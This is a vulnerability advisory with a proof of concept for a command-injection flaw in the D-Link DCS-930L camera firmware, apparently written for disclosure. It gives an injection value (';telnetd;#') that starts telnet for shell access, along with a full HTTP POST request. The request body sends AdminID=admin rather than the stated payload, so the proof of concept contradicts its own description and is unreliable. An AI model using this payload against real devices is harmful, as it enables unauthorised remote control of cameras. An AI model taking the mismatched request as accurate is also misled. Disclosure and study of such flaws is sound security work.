**Affected Product**: D-Link DCS930L
**Affected Firmware Versions**:  2.16.0.1
**Vulnerability Type**: Command Execution

------
### **Vulnerability Description**

In the latest firmware (v2.16.0.1) for the D-Link DCS-930L, a command-injection vulnerability was discovered that allows remote attackers to execute arbitrary OS commands via crafted requests. 


---
### **Vulnerability Details**

![[20251025223957.png]]
Within the `setSystemAdmin` handler in the `alphapd` binary, the `AdminID` value is sourced directly from attacker-controlled input and is subsequently interpolated into shell commands without proper sanitization or escaping. This makes it possible for an attacker to craft an `AdminID` that triggers arbitrary command execution.

---
### **PoC**
We set `AdminID` as **';telnetd;#** , and the router will excute it,such as:

```
POST /setSystemAdmin HTTP/1.1
Host: 192.168.0.163
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 113
Origin: http://192.168.0.163
Authorization: Basic YWRtaW46
Connection: close
Referer: http://192.168.0.163/advanced.htm
Upgrade-Insecure-Requests: 1
Priority: u=0, i

ReplySuccessPage=advanced.htm&ReplyErrorPage=errradv.htm&AdminID=admin&AdminPassword=admin&ConfigSystemAdmin=Save
```

get a shell
![[d9e06aa9e39fba8455f803ea2e5a9422.png]]
